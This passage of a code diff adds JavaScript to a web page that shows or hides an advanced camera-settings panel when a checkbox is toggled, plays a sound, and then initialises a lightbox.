+        advancedToggle.addEventListener('change', () => {
+            if(advancedToggle.checked) cameraCustomDiv.style.display = 'block';
+            else cameraCustomDiv.style.display = 'none';
+            playSound('checkbox');
+        });
+        if(advancedToggle.checked) cameraCustomDiv.style.display = 'block';
+        else cameraCustomDiv.style.display = 'none';
+    }
+    initLightbox();
+</script>
 </body>
 </html>
